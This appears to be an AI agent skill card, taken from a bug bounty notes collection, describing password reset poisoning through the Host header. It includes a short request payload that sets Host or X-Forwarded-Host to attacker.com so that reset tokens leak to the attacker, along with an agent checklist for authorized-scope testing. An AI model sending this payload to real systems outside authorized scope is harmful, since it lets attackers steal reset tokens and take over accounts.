# SKILL: Password Reset Poisoning via Host Header

**Skill id:** `tip/password-reset-poisoning-via-host-header`  
**Category:** Password Reset, Auth Bypass  
**Rating:** 🔥 قوية  
**Status:** Not started  
**Notion:** https://app.notion.com/p/402dac31e88081f6ad5cccb04fc1b8ed  

> **Authorized testing only.** LEAD until validated on accounts/objects you own. Never auto-confirm.

## When the agent should use this skill

- Hunting track involves: **Password Reset, Auth Bypass**
- Target signals match this technique
- Scope and testing envelope confirmed

## How It Works

الـ app بيبني لينك الريست من Host header. غيّره لـ [attacker.com](http://attacker.com) → التوكن بيروح عندك لما الضحية يفتح اللينك.

## Payload / Code

```
POST /forgot-password
Host: [attacker.com](http://attacker.com)
(or X-Forwarded-Host: [attacker.com](http://attacker.com))
```

## Source

Multiple 2025-2026 ATO writeups + PortSwigger

## Agent execution contract

1. Confirm asset is in authorized scope.
2. Baseline with an account/object you control.
3. Apply **one** mutation from the payload at a time.
4. Discriminate benign explanations (cache, public data, UI-only).
5. Classify as **LEAD** until unauthorized consequence is proven.
6. Stop if real third-party data appears beyond minimal evidence.
7. Hand off to report template only after validation checklist passes.

---
_Synced from Notion Bug Bounty Tips and Tricks · agent skill ready._
